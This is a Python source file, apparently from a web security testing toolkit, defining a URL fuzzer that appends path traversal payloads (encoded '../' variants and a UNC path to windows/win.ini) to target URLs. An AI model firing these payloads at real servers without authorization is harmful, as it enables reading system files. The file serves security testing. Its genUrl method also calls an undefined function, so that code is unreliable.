#!/usr/bin/env python
# -*- coding: utf-8 -*-

import random
from saker.fuzzers.fuzzer import Fuzzer
from saker.utils.url import urlBaseDir

class URL(Fuzzer):

    """URL"""

    payloads = [
        r'../',
        r'..;/',
        r'..././',
        r'...\\.\\',
        r'..\\',
        r'..\\/',
        r'%2e%2e%2f',
        r'%252e%252e%252f',
        r'%c0%ae%c0%ae%c0%af',
        r'%uff0e%uff0e%u2215',
        r'%uff0e%uff0e%u2216',
    ]

    _utf8 = {
        '.': '\u002e',
        '/': '\u2215',
        '\\': '\u2216',
    }

    unc = '\\\\localhost\\c$\\windows\\win.ini'

    scheme = [
        'http',
        'https',
    ]

    def __init__(self):
        super(URL, self).__init__()

    @classmethod
    def fuzz(cls, url):
        for p in cls.payloads:
            yield url + p
        for p in cls.payloads:
            yield urlBaseDir(url) + p

    @classmethod
    def genUrl(cls, scheme, user, password, domain, port, path):
        # scheme://[user:password@]domain:port/path?query#fragments
        url = ''
        url += scheme
        url += '://'
        if user and password:
            url += '%s:%s@' % s(user, password)
        url += domain
        url += ':' + port
        url += '/' + path
        return url

    @classmethod
    def shortUrl(cls):
        # windows short name
        # https://github.com/irsdl/IIS-ShortName-Scanner
        return ''
